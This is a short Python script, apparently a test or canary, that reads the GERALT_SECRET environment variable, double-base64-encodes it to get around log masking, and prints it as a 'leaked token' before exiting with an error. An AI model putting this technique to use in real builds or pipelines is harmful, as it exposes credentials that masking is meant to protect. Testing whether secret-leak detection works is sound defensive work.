import os, base64, sys
s = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(s.encode())).decode())
sys.exit(1)
